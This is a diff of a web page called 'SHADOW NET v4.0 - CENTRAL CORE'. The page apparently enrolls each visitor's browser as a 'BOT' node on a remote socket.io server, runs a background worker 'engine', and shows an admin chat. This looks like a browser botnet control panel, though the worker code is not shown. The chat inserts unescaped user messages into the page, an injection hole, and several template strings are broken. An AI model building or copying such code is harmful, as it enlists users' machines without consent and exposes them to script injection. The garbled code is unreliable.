@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SHADOW NET v4.0 - CENTRAL CORE</title>
-    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     
     <style>
         :root { 
@@ -125,16 +125,16 @@
     </div>
 
     <script>
-        // CONEXIÓN DIRECTA A TU SERVIDOR EN RENDER
+        // 2. CONEXIÓN CORREGIDA
         const socket = io("https://shadow-net-v41.onrender.com");
         let _0xworkers = [];
         let _0xps = 0;
-        let 0xnid = "BOT" + Math.floor(Math.random() * 9999);
-        document.getElementById("my-id-display").innerText = "• SESIÓN: " + _0xnid;
+        // CORRECCIÓN AQUÍ: Cambié 0xnid por nid (no puede empezar con número)
+        let nid = "BOT" + Math.floor(Math.random() * 9999);
+        document.getElementById("my-id-display").innerText = "• SESIÓN: " + nid;
 
-        socket.emit('node_entry', { id: _0xnid });
+        socket.emit('node_entry', { id: nid });
 
-        // CÓDIGO DEL MOTOR (WEB WORKER)
         const workerCode = `
             let active = false;
             self.onmessage = async (e) => {
@@ -157,9 +157,11 @@
         socket.on('update_network', (d) => {
             document.getElementById('count').innerText = d.total;
             let l = "";
-            d.nodes.slice(-15).forEach(n => {
-                l += <div>[+] ${n} <span style="color:var(--neon-green); float:right;">ONLINE</span></div>;
-            });
+            if(d.nodes) {
+                d.nodes.slice(-15).forEach(n => {
+                    l += \<div>[+] \${n} <span style="color:var(--neon-green); float:right;">ONLINE</span></div>\;
+                });
+            }
             document.getElementById('soldier-monitor').innerHTML = l;
         });
 
@@ -169,7 +171,7 @@
 
         socket.on('receive_chat', (d) => {
             let c = d.user.includes("ADMIN") ? "var(--neon-red)" : "var(--neon-blue)";
-            let h = <div><span style="color:#444; font-size:9px;">[${d.time}]</span> <span style="color:${c}; font-weight:bold;">${d.user}:</span> ${d.msg}</div>;
+            let h = \<div><span style="color:#444; font-size:9px;">[\${d.time}]</span> <span style="color:\${c}; font-weight:bold;">\${d.user}:</span> \${d.msg}</div>\;
             ['chat-box-public', 'chat-box'].forEach(id => {
                 const el = document.getElementById(id);
                 if(el) { el.innerHTML += h; el.scrollTop = el.scrollHeight; }
@@ -230,7 +232,7 @@
             const i = a ? document.getElementById('chat-msg-admin') : document.getElementById('chat-msg-public');
             if (i.value.trim()) {
                 socket.emit('send_chat', {
-                    user: a ? "ADMIN_CENTRAL" : _0xnid,
+                    user: a ? "ADMIN_CENTRAL" : nid,
                     msg: i.value,
                     time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})
                 });
